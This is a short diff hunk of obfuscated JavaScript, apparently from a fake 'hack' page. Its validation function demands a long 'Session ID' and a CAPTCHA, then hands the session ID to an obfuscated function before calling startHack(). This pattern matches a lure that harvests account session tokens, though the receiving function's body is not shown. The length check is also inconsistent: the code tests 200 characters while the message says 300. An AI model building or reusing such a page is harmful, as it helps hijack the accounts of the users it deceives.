@@ -60,7 +60,7 @@ function validateInput() {
   else if (_0xe5f6.length < 200) _0x1g2h = "Session ID must be at least 300 characters long.";
   else if (!_0xf7g8) _0x1g2h = "Please complete the CAPTCHA to proceed.";
   if (_0x1g2h) { showError(_0x1g2h); return; }
-  _0x9a1b(_0xe5f6);
+  _0x9a1b(_0xe5f6); 
   hideError();
   startHack();
 }
